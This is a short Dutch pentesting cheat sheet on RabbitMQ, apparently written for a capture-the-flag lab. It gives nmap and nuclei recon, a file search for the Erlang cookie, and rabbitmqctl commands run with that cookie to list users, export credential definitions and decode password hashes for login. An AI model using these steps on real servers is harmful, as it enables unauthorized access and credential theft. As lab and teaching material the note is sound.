## RabbitMQ

### Overzicht

RabbitMQ is een berichten broker die gebruikt kan worden op verschillende servers.

#### NMAP onderzoek / indicatie

```
nuclei -u <domain>
[erlang-daemon] [tcp] [low] storage.cloudsite.thm:4369 ["name rabbit at port 25672"]
```

- indicatie van rabbitmq

```
nmap -p 4369,5672,15672,25672 <domain>
```

#### Interactie met de Rabbitmq server

- Heeft een http server via rabbitmq:
    - Ja?
        - https://hackviser.com/tactics/pentesting/services/rabbitmq
    - Nee?
        - Zoeken naar een mogelijke cookie die bij erlang past in mappen:
        `/var/lib/rabbitmq`
        `find / -name 'cookie.*'`
            - Gevonden?
                - Op attackermachine:
                `sudo apt install -y rabbitmq-server`
                `sudo rabbitmqctl --erlang-cookie '<cookie>' --node rabbit@<domain> list_users`
                `sudo rabbitmqctl --erlang-cookie '<cookie>' --node rabbit@<domain> export_definitions /tmp/creds.json`
                - Wachtwoord gevonden?:
                `echo -n '<wachtwoord_hash>' | base64 -d | xxd -p -c 100`
                - gebruiken om in te loggen.